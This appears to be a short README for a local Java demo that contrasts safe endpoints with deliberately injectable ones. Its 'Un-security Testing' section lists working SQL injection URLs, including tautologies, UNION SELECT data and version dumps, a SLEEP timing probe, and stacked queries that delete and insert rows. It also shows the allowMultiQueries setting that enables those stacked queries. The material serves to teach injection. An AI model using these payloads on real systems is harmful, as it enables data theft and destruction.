# Security Testing
## JDBC Single
- http://localhost:8086/jdbc/security/single?id=c-1
## JDBC List
- http://localhost:8086/jdbc/security/list?title=DEV
## Template Single
- http://localhost:8086/template/security/single?id=c-1
## Template List
- http://localhost:8086/template/security/list?title=DEV

# Un-security Testing
## JDBC Single
- http://localhost:8086/jdbc/un-security/single?id=c-1' AND 'a'='a
- http://localhost:8086/jdbc/un-security/single?id=c-1' OR 1=1 LIMIT 3,1-- ;
- http://localhost:8086/jdbc/un-security/single?id=NOO' UNION SELECT * FROM PRODUCT limit 3,1-- ;
- http://localhost:8086/jdbc/un-security/single?id=NOO' UNION SELECT DATABASE(), VERSION(), USER()-- ;
- http://localhost:8086/jdbc/un-security/single?id=NOO' OR IF(1>0, SLEEP(10), 1)-- ;
## JDBC List
- http://localhost:8086/jdbc/un-security/list?title=DEV' OR 'a'='a
- http://localhost:8086/jdbc/un-security/list?title=NOO' LIMIT 0,100 -- ;
- http://localhost:8086/jdbc/un-security/list?title=DEV' UNION SELECT * FROM PRODUCT-- ;
- http://localhost:8086/jdbc/un-security/list?title=DEV';DELETE FROM CUSTOMER-- ;[allowMultiQueries=true]
- http://localhost:8086/jdbc/un-security/list?title=DEV';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-7','Andy','QA')-- ;[allowMultiQueries=true]
- http://localhost:8086/jdbc/un-security/list?title=DEV';INSERT INTO PRODUCT(ID, NAME, TITLE) VALUES ('p-7','Vivo X200','Phone')-- ;[allowMultiQueries=true]

# How to execute multiple queries in a single statement in java
- spring.datasource.url=jdbc:mysql://host/database?allowMultiQueries=true